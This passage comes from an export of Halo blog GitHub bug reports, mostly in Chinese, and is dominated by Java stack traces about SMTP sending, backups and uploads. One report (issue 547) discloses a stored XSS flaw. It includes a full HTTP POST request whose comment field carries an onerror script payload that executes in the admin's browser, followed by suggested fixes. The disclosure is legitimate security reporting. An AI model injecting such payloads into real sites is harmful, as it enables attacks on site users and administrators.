org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at java.lang.reflect.Method.invoke(Method.java:498) ~[na:1.8.0_222] at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:1.8.0_222] at sun.reflect.GeneratedMethodAccessor216.invoke(Unknown Source) ~[na:na] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:1.2.0] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at run.halo.app.controller.admin.api.MailController$$FastClassBySpringCGLIB$$892427bc.invoke(&lt;generated&gt;) ~[classes!/:1.2.0] at run.halo.app.controller.admin.api.MailController.testMail(MailController.java:33) ~[classes!/:1.2.0] at run.halo.app.service.impl.MailServiceImpl.sendMail(MailServiceImpl.java:55) ~[classes!/:1.2.0] run.halo.app.exception.EmailException: 发送邮件到 destination@example.com 失败，请检查 SMTP 服务配置是否正确 ```  ---  ## 配置文件 (`admin/index.html#/system/options` 中的 SMTP 设置栏)  ``` SMTP 地址：email-smtp.us-east-1.amazonaws.com 发送协议：smtp SSL 端口：465 邮件账号: USERNAME 邮件密码: PASSWORD 发件人：Blog &lt;sender@example.com&gt; ```  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  期望使用以下SMTP报文正常发送邮件： ``` SMTP Address：email-smtp.us-east-1.amazonaws.com Username: USERNAME Password: PASSWORD SMTP FROM: Blog &lt;sender@example.com&gt; ``` **请格外注意SMTP FROM**  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;  实际使用了以下SMTP报文进行发送： ``` SMTP Address：email-smtp.us-east-1.amazonaws.com Username: USERNAME Password: PASSWORD SMTP FROM: Blog &lt;sender@example.com&gt; &lt;USERNAME&gt; ``` **请格外注意SMTP FROM**   经过一番努力追查，在上游依赖 `OhMyEmail` 的组件 https://github.com/biezhi/oh-my-email/blob/master/src/main/java/io/github/biezhi/ome/OhMyEmail.java#L119-L142 发现了相关代码，其中 https://github.com/biezhi/oh-my-email/blob/master/src/main/java/io/github/biezhi/ome/OhMyEmail.java#L137 直接append了邮箱账号作为了发件方。  Amazon SES的邮箱账号与密码是一组生成的随机字符串，指定发件方邮箱地址需要在 `SMTP的FROM` 中指定，例如已经验证的可作为发送邮件的邮箱域名为 `example.com`，则可使用 `Foo &lt;bar@example.com&gt;`, `Alice &lt;alice@example.com&gt;` 等进行发送，收件方会看到相对应的邮件发送方地址。然而 `OhMyEmail` 则直接拼接了邮箱账号，并不是一合法邮箱地址，会造成调用Amazon SES方服务出错。  ## 建议解决方案 考虑到上游依赖好像不怎么维护了，个人建议可以更换到其他符合 `SMTP` 实现标准的邮件依赖，亦或者自行实现一套简易的邮件client。  如果可以解决这个问题就太感谢啦~</body>
		<created>2020-02-20 05:06:16</created>
		<closed>2020-02-21 13:21:29</closed>
	</bug>
	<bug>
		<id>564</id>
		<title>中文链接存在无法匹配 url 的问题</title>
		<body>`@RequestMapping` 中的 `url` 匹配应该更加宽松。否则可能出现 url 无法匹配的问题，进而出现 405 错误。</body>
		<created>2020-02-11 09:32:38</created>
		<closed>2020-02-25 06:19:06</closed>
	</bug>
	<bug>
		<id>553</id>
		<title>更新主题操作不会刷新主题相关的缓存</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  更新主题之后触发刷新主题信息的事件  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;  不会触发。</body>
		<created>2020-02-10 08:02:08</created>
		<closed>2020-02-10 10:24:37</closed>
	</bug>
	<bug>
		<id>549</id>
		<title>/avatar 或者 /logo 等接口对相对地址敏感</title>
		<body># 描述  如果用户的头像地址为：`//cn.gravatar.com/avatar/xxxxxxxxxxxxxxxxxxxxxxxxxs=256&amp;d=mm`，则我们通过 /avatar 获取头像的时候会跳转到 `https://domain.com//cn.gravatar.com/avatar/xxxxxxxxxxxxxxxxxxxxxxxxxs=256&amp;d=mm`，并不符合预期。  # 期望  希望能够提供一个单元测试，保证该功能有效。</body>
		<created>2020-02-09 03:32:55</created>
		<closed>2020-02-23 15:34:21</closed>
	</bug>
	<bug>
		<id>547</id>
		<title>Stored xss on Halo blog</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/archives/other-faq --&gt;  ## Environment Server Version：1.2.0 Admin Version：1.2.0 DataBase：H2  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## Vulnerability details  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt; Halo blog allows users to submit comments on blog posts, Application receives data from an untrusted source and not filtered. ### step1: submit comment ![image](https://user-images.githubusercontent.com/25348551/74082015-8415f900-4a90-11ea-9e11-cae159277e1a.png) The post packet is as follows： ``` POST /api/content/posts/comments HTTP/1.1 Host: 192.168.0.104:8090 Content-Length: 132 Accept: application/json, text/plain, */* Content-Type: application/json;charset=UTF-8 Origin: http://192.168.0.104:8090 Referer: http://192.168.0.104:8090/archives/hello-halo Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close  {"author":"guest1","authorUrl":"http://test.com","email":"guest@gmail.com","content":"&lt;img src=1 onerror=alert(/test/)&gt;","postId":1} ```  ### step2: view the blog post  After this comment has been submitted, admin who visits the blog post. The script supplied by the attacker will then execute in the victim user's browser.  ![image](https://user-images.githubusercontent.com/25348551/74082047-dce59180-4a90-11ea-9282-272729836201.png) ![image](https://user-images.githubusercontent.com/25348551/74082049-e40c9f80-4a90-11ea-92b9-cf0eb635e764.png)  code: src/main/java/run/halo/app/controller/content/api/PostController.java ![image](https://user-images.githubusercontent.com/25348551/74082064-0c949980-4a91-11ea-8ff5-0d703cfbc5f5.png)  ## Suggestions for repair - Proper encoding of untrusted request data - Rich text filtering uses a common security API library for each programming language - Escaping special characters using the developer's secure escape library &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-02-08 08:43:59</created>
		<closed>2020-03-16 09:15:11</closed>
	</bug>
	<bug>
		<id>542</id>
		<title>获取历史备份和手动备份博客的功能出现错误</title>
		<body># 错误信息  ```java 2020-02-03 06:20:14.270 ERROR 18551 --- [XNIO-1 task-4] r.h.app.core.ControllerExceptionHandler  : Captured an exception 2020-02-03 06:16:55.744  WARN 18551 --- [Timer-0] run.halo.app.cache.AbstractCacheStore    : Cache key: [cache_lock_public run.halo.app.security.token.AuthToken run.halo.app.controller.admin.api.AdminController.refresh(java.lang.String)] has been expired  ... 88 common frames omitted at run.halo.app.service.impl.BackupServiceImpl.listHaloBackups(BackupServiceImpl.java:195) ~[classes!/:1.2.1] at java.base/java.nio.file.Files.list(Files.java:3760) ~[na:na] at java.base/java.nio.file.Files.newDirectoryStream(Files.java:475) ~[na:na] at java.base/sun.nio.fs.UnixFileSystemProvider.newDirectoryStream(UnixFileSystemProvider.java:432) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:116) ~[na:na] at java.base/sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:111) ~[na:na] at java.base/sun.nio.fs.UnixException.translateToIOException(UnixException.java:92) ~[na:na] Caused by: java.nio.file.NoSuchFileException: /tmp/halo-backup at java.base/java.lang.Thread.run(Thread.java:830) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) ~[spring-boot-actuator-2.2.2.RELEASE.jar!/:2.2.2.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at run.halo.app.filter.CorsFilter.doFilter(CorsFilter.java:41) ~[classes!/:1.2.1] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at run.halo.app.security.filter.AbstractAuthenticationFilter.doFilterInternal(AbstractAuthenticationFilter.java:167) ~[classes!/:1.2.1] at run.halo.app.security.filter.AdminAuthenticationFilter.doAuthenticate(AdminAuthenticationFilter.java:89) ~[classes!/:1.2.1] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.28.Final.jar!/:2.0.28.Final] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:503) ~[jakarta.servlet-api-4.0.3.jar!/:4.0.3] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at java.base/java.lang.reflect.Method.invoke(Method.java:567) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at run.halo.app.controller.admin.api.BackupController$$EnhancerBySpringCGLIB$$e5a8efca.listBackups(&lt;generated&gt;) ~[classes!/:1.2.1] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at java.base/java.lang.reflect.Method.invoke(Method.java:567) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at jdk.internal.reflect.GeneratedMethodAccessor244.invoke(Unknown Source) ~[na:na] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes!/:1.2.1] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.2.RELEASE.jar!/:5.2.2.RELEASE] at run.halo.app.controller.admin.api.BackupController$$FastClassBySpringCGLIB$$810ea7c7.invoke(&lt;generated&gt;) ~[classes!/:1.2.1] ```  # 错误分析  从日志中来看，似乎是没有创建好 halo-backup 临时文件夹造成的。</body>
		<created>2020-02-03 06:22:37</created>
		<closed>2020-02-12 13:45:45</closed>
	</bug>
	<bug>
		<id>529</id>
		<title>文件上传至本地功能可能存在内存泄漏</title>
		<body># 复现  将附件位置设置为本地，然后多次上传大图片，观察内存占用。</body>
		<created>2020-01-31 03:10:18</created>
		<closed>2020-03-14 03:14:16</closed>
	</bug>
	<bug>
		<id>521</id>
		<title>所有上传接口不稳定，需要排查一下。</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ``` ... 54 common frames omitted at io.undertow.server.handlers.form.MultiPartParserDefinition$MultiPartUploadHandler.beginPart(MultiPartParserDefinition.java:254) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at java.nio.file.Files.createTempFile(Files.java:852) ~[na:1.8.0_221] at java.nio.file.TempFileHelper.createTempFile(TempFileHelper.java:161) ~[na:1.8.0_221] at java.nio.file.TempFileHelper.create(TempFileHelper.java:138) ~[na:1.8.0_221] at java.nio.file.Files.createFile(Files.java:632) ~[na:1.8.0_221] at java.nio.file.Files.newByteChannel(Files.java:361) ~[na:1.8.0_221] at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214) ~[na:1.8.0_221] at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107) ~[na:1.8.0_221] at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102) ~[na:1.8.0_221] at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86) ~[na:1.8.0_221] Caused by: java.nio.file.NoSuchFileException: /tmp/undertow.8410319932659743251.80/undertow6854475745071598809upload at java.lang.Thread.run(Thread.java:748) [na:1.8.0_221] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_221] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_221] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) [undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) [undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) 